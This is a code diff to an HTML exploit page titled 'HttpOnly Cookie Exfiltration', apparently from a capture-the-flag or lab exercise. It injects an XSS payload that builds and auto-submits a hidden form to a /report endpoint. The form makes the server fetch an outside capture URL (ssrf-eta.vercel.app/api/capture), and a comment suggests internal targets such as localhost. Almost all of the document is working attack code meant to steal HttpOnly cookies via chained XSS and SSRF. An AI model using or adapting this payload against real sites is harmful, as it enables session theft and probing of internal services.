@@ -3,11 +3,32 @@
 <head>
     <title>HttpOnly Cookie Exfiltration</title>
     <script>
-        // Exploit combining SSRF and XSS to retrieve HttpOnly cookies
+        // Inject XSS payload into the vulnerable endpoint
         const xssPayload = `
-            // Create an image to trigger the SSRF
-            var img = new Image();
-            img.src = "/report?url=https://ssrf-eta.vercel.app/api/capture";
+            alert("XSS executed!");
+            console.log("Injecting SSRF payload...");
+
+            // Create a form to submit the SSRF payload to /report
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = '/report';
+
+            // Add the URL input targeting your capture endpoint
+            const urlInput = document.createElement('input');
+            urlInput.type = 'hidden';
+            urlInput.name = 'url';
+            urlInput.value = 'https://ssrf-eta.vercel.app/api/capture'; // Or try an internal URL like 'http://localhost:5000/'
+            form.appendChild(urlInput);
+
+            // Add the description input
+            const descInput = document.createElement('textarea');
+            descInput.name = 'desc';
+            descInput.value = 'Testing SSRF.';
+            form.appendChild(descInput);
+
+            // Automatically submit the form
+            document.body.appendChild(form);
+            form.submit();
         `;
 
         // Vulnerable endpoint with the XSS injection
@@ -18,6 +39,6 @@
     </script>
 </head>
 <body>
-    <p>Redirecting to extract HttpOnly cookies...</p>
+    <p>Redirecting to extract HttpOnly cookies via SSRF...</p>
 </body>
 </html>
